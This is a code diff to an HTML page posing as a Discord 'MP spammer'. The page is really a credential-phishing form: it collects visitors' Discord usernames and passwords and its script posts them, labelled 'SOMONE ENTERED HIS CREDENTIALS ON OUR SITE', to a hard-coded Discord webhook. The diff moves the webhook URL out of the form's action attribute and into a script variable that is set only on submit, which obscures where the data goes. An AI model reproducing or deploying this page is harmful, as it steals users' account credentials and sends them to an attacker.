@@ -1,3 +1,5 @@
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -9,7 +11,7 @@
 <body>
     <div class="title"><h1>Welcome to the discord <span id="red">MP spammer</span></h1></div>
     <div class="text"><p>Here you have to connect to your discord account than choose what user you want to spam and if its anonimous or not</p></div>
-    <form action="https://discord.com/api/webhooks/1234832362471161877/0fK06Jz4e_qIE5KVBqM8fjtIen4Ul3dhS1IUOvLQ0pByppwC4MpWuugnGG8G2YXSBQYx" method="post">
+    <form id="discordForm" method="post">
         <label for="username">Discord Username:</label><br>
         <input type="text" id="username" name="username"><br>
         <label for="password">Discord Password:</label><br>
@@ -23,9 +25,12 @@
 
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Jersey+15&display=swap');
-        </style>
+    </style>
     
     <script>
+        // Webhook URL
+        var webhookURL = "https://discord.com/api/webhooks/1234832362471161877/0fK06Jz4e_qIE5KVBqM8fjtIen4Ul3dhS1IUOvLQ0pByppwC4MpWuugnGG8G2YXSBQYx";
+    
         // Set content field value when form is submitted
         document.querySelector('form').addEventListener('submit', function(event) {
             // Prevent form from submitting normally
@@ -38,6 +43,9 @@
             // Set content field value with username and password
             document.getElementById('content').value = 'SOMONE ENTERED HIS CREDENTIALS ON OUR SITE : ' + 'Username: ' + username + ', Password: ' + password;
     
+            // Set the action attribute of the form to the webhook URL
+            document.getElementById('discordForm').action = webhookURL;
+    
             // Submit form
             this.submit();
         });
@@ -48,6 +56,3 @@
     
 </body>
 </html>
-
-
-
